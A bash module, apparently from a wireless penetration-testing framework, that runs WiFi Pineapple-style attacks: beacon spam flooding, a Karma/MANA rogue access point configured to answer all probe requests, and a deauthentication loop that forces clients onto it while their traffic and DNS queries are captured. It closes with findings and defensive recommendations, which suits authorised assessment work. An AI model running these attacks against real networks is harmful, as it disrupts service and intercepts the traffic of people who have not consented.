#!/usr/bin/env bash
# MODULE_META
# NAME="PineAP / Karma Attack"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="mdk4,hostapd-mana"
# DESC="Beacon spam, Karma/MANA auto-probe response, Dogma deauth+karma"
# REQS="monitor_iface,target_ssid,target_channel"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f2_pineap_karma.sh
#  F2: PineAP / Karma Attack Suite
#
#  PURPOSE:
#    Implement WiFi Pineapple-style attacks. Includes:
#      Mode A: Beacon Spam — flood area with fake SSIDs to confuse clients/WIDS
#      Mode B: Karma/MANA — auto-respond to all probe requests, lure clients
#      Mode C: Dogma — deauth real AP + karma to force client migration
#    Tests client susceptibility to auto-connecting to rogue networks.
#
#  TOOLS: ${TOOL_PATHS[hostapd]}-mana, ${TOOL_PATHS[hostapd]}, ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[airmon-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/channel)
#
#  EVIDENCE PRODUCED:
#    - f2_probe_log.txt              (client probe requests captured)
#    - f2_beacon_flood.txt           (beacon spam statistics)
#    - f2_karma_clients.txt          (clients that connected to karma AP)
#    - f2_captured_traffic.pcap      (traffic from connected clients)
#    - f2_findings.txt               (analysis summary)
#
#  RESULT JSON FIELDS:
#    - attack_mode: string (beacon_spam|karma|dogma)
#    - clients_lured: int
#    - probed_ssids: int — unique SSIDs in probe requests
#    - unique_clients: int — unique client MACs observed
#    - credentials_captured: int
#===============================================================================

run_f2() {
    set -euo pipefail
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/f2"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    if ! check_module_dependencies "F2"; then
        return 1
    fi

    local has_hostapd_mana=false
    local has_hostapd=false
    local has_mdk4=false
    local has_aireplay=false

    command -v hostapd-mana &>/dev/null && has_hostapd_mana=true
    command -v hostapd &>/dev/null && has_hostapd=true
    command -v mdk4 &>/dev/null && has_mdk4=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true

    if [[ "$has_hostapd_mana" == "false" && "$has_hostapd" == "false" && "$has_mdk4" == "false" ]]; then
        log_error "At least one of hostapd-mana, hostapd, or mdk4 is required."
        return 1
    fi

    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."
        return 1
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID:-unknown}) CH ${GUEST_CHANNEL:-auto}"

    export KARMA_SSID="${GUEST_SSID}"
    save_session_state

    #--- Attack Mode Selection (PineAP-style menu) ---
    echo ""
    echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_CYAN}║  ${C_BOLD}PineAP ATTACK SUITE${C_RESET}${C_CYAN}                                              ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Target SSID: ${C_BOLD}${GUEST_SSID}${C_RESET}${C_CYAN}                                             ║${C_RESET}"
    echo -e "${C_CYAN}║  Karma SSID:  ${C_BOLD}${KARMA_SSID}${C_RESET}${C_CYAN}                                             ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Select attack mode:                                               ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║   [${C_BOLD}A${C_RESET}${C_CYAN}] Beacon Spam (confuse clients/WIDS)                          ║${C_RESET}"
    echo -e "${C_CYAN}║   [${C_BOLD}B${C_RESET}${C_CYAN}] Karma / MANA Attack (auto-respond probes)                  ║${C_RESET}"
    echo -e "${C_CYAN}║   [${C_BOLD}C${C_RESET}${C_CYAN}] Dogma (Deauth + Karma)                                      ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║   [${C_BOLD}T${C_RESET}${C_CYAN}] Select Target from Scan Results (A1)                        ║${C_RESET}"
    echo -e "${C_CYAN}║   [${C_BOLD}S${C_RESET}${C_CYAN}] Set custom Karma SSID (currently: ${KARMA_SSID})               ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""

    local attack_mode=""
    while true; do
        get_or_request_param "mode_choice" "  Select [A/B/C/T/S]"
        case "${mode_choice^^}" in
            "A") attack_mode="beacon_spam"; break ;;
            "B") attack_mode="karma"; break ;;
            "C") attack_mode="dogma"; break ;;
            "T") if select_target_network; then
                     local KARMA_SSID="${GUEST_SSID}"
                     echo -e "  ${C_GREEN}Target and Karma SSID updated to: ${KARMA_SSID}${C_RESET}"
                 fi
                 continue ;;
            "S") echo ""
                 get_or_request_param "custom_ssid" "  Enter custom SSID for Karma [default: ${GUEST_SSID}]"
                 KARMA_SSID="${custom_ssid:-$GUEST_SSID}"
                 # Re-render summary part of menu or just confirm
                 echo -e "  ${C_GREEN}Karma SSID updated to: ${KARMA_SSID}${C_RESET}"
                 continue ;;
            *) echo -e "${C_RED}  Invalid choice. Enter A, B, C, or S.${C_RESET}" ;;
        esac
    done

    local clients_lured=0
    local probed_ssids=0
    local unique_clients=0
    local credentials_captured=0
    local findings_file="${evidence_prefix}_findings.txt"
    local probe_log="${evidence_prefix}_probe_log.txt"
    local beacon_log="${evidence_prefix}_beacon_flood.txt"
    local karma_clients="${evidence_prefix}_karma_clients.txt"
    local traffic_pcap="${evidence_prefix}_captured_traffic.pcap"

    {
        echo "============================================================"
        echo "  F2: PineAP / Karma Attack Suite"
        echo "  Mode: ${attack_mode}"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID}"
        echo "  Rogue SSID: ${KARMA_SSID}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    : > "$probe_log"
    : > "$karma_clients"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Passive probe request capture ---
    log_step 3 $total_steps "Capturing client probe requests (30s)"
    update_tc_progress 3 $total_steps "Probe capture"

    local probe_pcap="$TMP_DIR/f2_probes.pcap"

    timeout 30 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$probe_pcap" \
        "type mgt subtype probe-req" &>/dev/null || true

    # Parse probe requests
    if command -v tshark &>/dev/null && [[ -f "$probe_pcap" ]]; then
        ensure_user_ownership "$probe_pcap"
        # Extract unique probed SSIDs
        local ssid_list
        local ssid_list=$(run_as_user tshark -r "$probe_pcap" \
            -T fields -e wlan.ssid -e wlan.sa \
            2>/dev/null | sort -u | grep -v "^$" || true)

        if [[ -n "$ssid_list" ]]; then
            local probed_ssids=$(echo "$ssid_list" | awk '{print $1}' | sort -u | wc -l) || true
            local unique_clients=$(echo "$ssid_list" | awk '{print $2}' | sort -u | wc -l) || true

            {
                echo "============================================================"
                echo "  Client Probe Request Analysis"
                echo "  ${unique_clients} unique clients probing ${probed_ssids} SSIDs"
                echo "============================================================"
                echo ""
                echo "$ssid_list"
            } > "$probe_log"

            log_info "Captured: ${unique_clients} clients probing for ${probed_ssids} SSIDs"
        fi
    fi
    rm -f "$probe_pcap"

    check_abort || return 1

    #--- Step 4-5: Execute selected attack ---
    case "$attack_mode" in
        "beacon_spam")
            #--- Mode A: Beacon Spam ---
            log_step 4 $total_steps "Executing beacon spam flood"
            update_tc_progress 4 $total_steps "Beacon spam"

            if [[ "$has_mdk4" == "true" ]]; then
                echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
                echo "  ★ BEACON SPAM: Flooding area with ~500 fake SSIDs for 30s"
                echo -e "${C_RESET}"

                {
                    echo "============================================================"
                    echo "  Beacon Spam Attack"
                    echo "  Duration: 30 seconds"
                    echo "============================================================"
                    echo ""
                } > "$beacon_log"

                log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} b -w nta -c ${GUEST_CHANNEL:-1}"

                timeout 30 ${TOOL_PATHS[mdk4]} "$mon_iface" b \
                    -w nta \
                    -c "${GUEST_CHANNEL:-1}" \
                    > "$TMP_DIR/f2_mdk4.log" 2>&1 || true

                if [[ -f "$TMP_DIR/f2_mdk4.log" ]]; then
                    cat "$TMP_DIR/f2_mdk4.log" >> "$beacon_log"
                fi
                rm -f "$TMP_DIR/f2_mdk4.log"

                log_success "Beacon spam completed (30s)"
                echo "Beacon spam flood completed" >> "$findings_file"
            else
                log_warn "${TOOL_PATHS[mdk4]} not available — beacon spam requires ${TOOL_PATHS[mdk4]}"
            fi

            log_step 5 $total_steps "Monitoring for WIDS response to beacon flood"
            update_tc_progress 5 $total_steps "WIDS check"

            start_countdown 15 "Monitoring for WIDS response to beacon flood"
            sleep 15
            stop_countdown
            ;;

        "karma"|"dogma")
            #--- Mode B/C: Karma (MANA) Attack ---
            log_step 4 $total_steps "Deploying Karma/MANA rogue AP"
            update_tc_progress 4 $total_steps "Karma AP"

            # Need managed mode for AP
            disable_monitor_mode
            sleep 2

            local ap_iface="${WIFI_INTERFACE:-wlan0}"
            # Find secondary interface for deauth in dogma mode
            local deauth_iface=""
            if [[ "$attack_mode" == "dogma" ]]; then
                local deauth_iface=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${ap_iface}$" | grep -v "mon" | head -1)
            fi

            if [[ "$has_hostapd_mana" == "true" ]]; then
                # Create MANA config with karma enabled
                local mana_conf="$TMP_DIR/f2_mana.conf"
                cat > "$mana_conf" <<MANA_CONF
interface=${ap_iface}
driver=nl80211
ssid=${KARMA_SSID}
channel=${GUEST_CHANNEL:-6}
hw_mode=g

# Open network for karma
auth_algs=1
wpa=0

# MANA/Karma: respond to ALL probe requests
enable_mana=1
mana_loud=1
mana_macacl=0
MANA_CONF

                # Setup DHCP for connected clients
                local dnsmasq_conf="$TMP_DIR/f2_dnsmasq.conf"
                cat > "$dnsmasq_conf" <<DNSMASQ_CONF
interface=${ap_iface}
dhcp-range=10.29.0.10,10.29.0.100,255.255.255.0,12h
dhcp-option=3,10.29.0.1
dhcp-option=6,10.29.0.1
no-resolv
server=8.8.8.8
log-queries
log-facility=$TMP_DIR/f2_dns.log
DNSMASQ_CONF

                # Configure AP interface
                run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
                run_tool ip addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
                run_tool ip link set "$ap_iface" up 2>/dev/null || true

                # Start karma AP
                log_cmd "${TOOL_PATHS[hostapd]}-mana ${mana_conf} (karma=ON, loud=ON)"
                ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > $TMP_DIR/f2_mana.log 2>&1 &
                local mana_pid=$!
                register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; sleep 0.5; kill -9 $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"
                sleep 3

                # Start DHCP
                ${TOOL_PATHS[dnsmasq]} -C "$dnsmasq_conf" &
                local dnsmasq_pid=$!
                register_cleanup "kill -TERM $dnsmasq_pid 2>/dev/null || true; sleep 0.5; kill -9 $dnsmasq_pid 2>/dev/null || true; wait $dnsmasq_pid 2>/dev/null || true"

                # Capture connected client traffic
                ${TOOL_PATHS[tcpdump]} -i "$ap_iface" -w "$traffic_pcap" \
                    &>/dev/null &
                local tcap_pid=$!
                register_cleanup "kill -SIGINT $tcap_pid 2>/dev/null || true; wait $tcap_pid 2>/dev/null || true"

                # Dogma mode: deauth real AP simultaneously
                if [[ "$attack_mode" == "dogma" && -n "$deauth_iface" && "$has_aireplay" == "true" ]]; then
                    log_step 5 $total_steps "Dogma: Deauthing clients from real AP"
                    update_tc_progress 5 $total_steps "Deauth + Karma"

                    # Put deauth interface into monitor mode
                    run_tool ip link set "$deauth_iface" down 2>/dev/null
                    iw dev "$deauth_iface" set type monitor 2>/dev/null || true
                    run_tool ip link set "$deauth_iface" up 2>/dev/null
                    iw dev "$deauth_iface" set channel "${GUEST_CHANNEL:-6}" 2>/dev/null || true

                    # Send continuous deauths
                    (
                        for round in $(seq 1 6); do
                            ${TOOL_PATHS[aireplay-ng]} --deauth 5 -a "${GUEST_BSSID:-FF:FF:FF:FF:FF:FF}" \
                                "$deauth_iface" &>/dev/null || true
                            sleep 15
                        done
                    ) &
                    local deauth_pid=$!
                    register_cleanup "kill -TERM $deauth_pid 2>/dev/null || true; sleep 0.5; kill -9 $deauth_pid 2>/dev/null || true; wait $deauth_pid 2>/dev/null || true"
                else
                    log_step 5 $total_steps "Karma AP active — waiting for clients"
                    update_tc_progress 5 $total_steps "Waiting"
                fi

                start_countdown 120 "Karma/MANA AP active — luring clients"
                sleep 120
                stop_countdown

                # Stop everything
                kill -TERM $mana_pid 2>/dev/null; wait $mana_pid 2>/dev/null
                kill -TERM $dnsmasq_pid 2>/dev/null; wait $dnsmasq_pid 2>/dev/null
                kill -SIGINT $tcap_pid 2>/dev/null; wait $tcap_pid 2>/dev/null

                if [[ "$attack_mode" == "dogma" && -n "${deauth_pid:-}" ]]; then
                    kill -TERM $deauth_pid 2>/dev/null; wait $deauth_pid 2>/dev/null
                    # Restore deauth interface
                    run_tool ip link set "$deauth_iface" down 2>/dev/null
                    iw dev "$deauth_iface" set type managed 2>/dev/null || true
                    run_tool ip link set "$deauth_iface" up 2>/dev/null
                fi

                # Parse MANA log for connected clients
                if [[ -f $TMP_DIR/f2_mana.log ]]; then
                    local conn_clients
                    local conn_clients=$(grep -iE "AP-STA-CONNECTED|associated|MANA" $TMP_DIR/f2_mana.log \
                        | grep -oP '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u || true)

                    if [[ -n "$conn_clients" ]]; then
                        local clients_lured=$(echo "$conn_clients" | wc -l)
                        {
                            echo "Clients connected to Karma AP:"
                            echo "$conn_clients"
                        } > "$karma_clients"
                        log_result "FINDING" "${clients_lured} client(s) connected to Karma/MANA AP!"
                        echo "FINDING: ${clients_lured} clients lured to karma AP" >> "$findings_file"
                    fi
                fi

                # Check DNS log for queries from captured clients
                if [[ -f $TMP_DIR/f2_dns.log ]]; then
                    local dns_queries
                    local dns_queries=$(grep "query" $TMP_DIR/f2_dns.log | wc -l) || true
                    if [[ ${dns_queries:-0} -gt 0 ]]; then
                        log_info "Captured ${dns_queries} DNS queries from lured clients"
                        echo "DNS queries from lured clients: ${dns_queries}" >> "$findings_file"
                    fi
                fi

                # Cleanup temps
                rm -f "$mana_conf" "$dnsmasq_conf" $TMP_DIR/f2_mana.log $TMP_DIR/f2_dns.log

            elif [[ "$has_hostapd" == "true" ]]; then
                # Fallback: regular ${TOOL_PATHS[hostapd]} (no MANA/karma)
                log_warn "${TOOL_PATHS[hostapd]}-mana not available — using regular ${TOOL_PATHS[hostapd]} (no auto-probe response)"

                local hostapd_conf="$TMP_DIR/f2_hostapd.conf"
                cat > "$hostapd_conf" <<HOSTAPD_CONF
interface=${ap_iface}
driver=nl80211
ssid=${KARMA_SSID}
channel=${GUEST_CHANNEL:-6}
hw_mode=g
auth_algs=1
wpa=0
HOSTAPD_CONF

                run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
                run_tool ip addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
                run_tool ip link set "$ap_iface" up 2>/dev/null || true

                ${TOOL_PATHS[hostapd]} "$hostapd_conf" > $TMP_DIR/f2_hostapd.log 2>&1 &
                local hp_pid=$!
                register_cleanup "kill -TERM $hp_pid 2>/dev/null || true; sleep 0.5; kill -9 $hp_pid 2>/dev/null || true; wait $hp_pid 2>/dev/null || true"

                log_step 5 $total_steps "Open AP active — waiting for clients (60s)"
                update_tc_progress 5 $total_steps "Waiting"

                start_countdown 60 "Open AP active — waiting for clients"
                sleep 60
                stop_countdown

                kill -TERM $hp_pid 2>/dev/null; wait $hp_pid 2>/dev/null

                if [[ -f $TMP_DIR/f2_hostapd.log ]]; then
                    local conn
                    local conn=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f2_hostapd.log) || true
                    local clients_lured=${conn:-0}
                fi

                rm -f "$hostapd_conf" $TMP_DIR/f2_hostapd.log
            fi

            # Restore AP interface
            run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
            run_tool ip link set "$ap_iface" down 2>/dev/null
            iw dev "$ap_iface" set type managed 2>/dev/null || true
            run_tool ip link set "$ap_iface" up 2>/dev/null
            ;;
    esac

    #--- Step 6: Restore normal mode ---
    log_step 6 $total_steps "Restoring managed mode"
    update_tc_progress 6 $total_steps "Cleanup"

    ensure_managed_mode 2>/dev/null || true
    sleep 3

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $clients_lured -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="${clients_lured} client(s) connected to the Karma/rogue AP (mode: ${attack_mode}). "
        result_summary+="${unique_clients} unique clients were probing for ${probed_ssids} saved SSIDs. "
        result_summary+="Devices are susceptible to auto-connecting to rogue networks."
        local recommendations="1) Disable auto-connect to open networks on all managed devices (MDM policy). "
        recommendations+="2) Remove saved open WiFi networks from device profiles. "
        recommendations+="3) Deploy WIDS to detect and alert on Karma/MANA attacks. "
        recommendations+="4) Educate users about rogue AP risks. "
        recommendations+="5) Use 802.1X with certificate validation — immune to Karma."
    elif [[ $probed_ssids -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="${unique_clients} client(s) probing for ${probed_ssids} saved WiFi networks. No clients connected to Karma AP, but probe information is exposed."
        local recommendations="1) Configure devices to not broadcast probe requests for saved networks. "
        recommendations+="2) Use randomized MAC addresses for probe requests. "
        recommendations+="3) Remove unused saved WiFi profiles from managed devices."
    else
        local result_summary="No clients were lured to the rogue AP, and minimal probe activity was observed."
        local recommendations="Client hygiene appears good. Continue monitoring."
    fi

    local result_json
    evidence_register_file "f2_probe_log.txt"
    evidence_register_file "f2_beacon_flood.txt"
    evidence_register_file "f2_karma_clients.txt"
    evidence_register_file "f2_captured_traffic.pcap"
    evidence_register_file "f2_findings.txt"

    local result_json=$(run_fg --quiet jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Mode: ${attack_mode}, Clients lured: ${clients_lured}, Probed SSIDs: ${probed_ssids}, Unique clients: ${unique_clients}" \
        --arg recommendations "$recommendations" \
        --arg attack_mode "$attack_mode" \
        --argjson clients_lured "$clients_lured" \
        --argjson probed_ssids "${probed_ssids:-0}" \
        --argjson unique_clients "${unique_clients:-0}" \
        --argjson credentials_captured "$credentials_captured" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            attack_mode: $attack_mode,
            clients_lured: $clients_lured,
            probed_ssids: $probed_ssids,
            unique_clients: $unique_clients,
            credentials_captured: $credentials_captured
                    }')

    local has_tool_output=0
    [[ -f "$probe_log" || -f "$beacon_log" || -f "$karma_clients" ]] && has_tool_output=1

    local has_primary=0
    [[ -f "$traffic_pcap" ]] && has_primary=1

    # save_tc_result: pcap_req, tool_out, prim_art, cmds, vers, env, confirm, known_target, runtime, clean, secure
    save_tc_result "F2" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 0
    save_session_state

    echo ""
    if [[ $clients_lured -gt 0 ]]; then
        log_result "FINDING" "★ ${clients_lured} client(s) lured to Karma AP (${attack_mode} mode)"
    elif [[ $probed_ssids -gt 0 ]]; then
        log_result "FINDING" "${unique_clients} device(s) broadcasting ${probed_ssids} saved SSIDs"
    else
        log_result "SECURE" "No clients susceptible to Karma/rogue AP attack"
    fi

    return 0
}
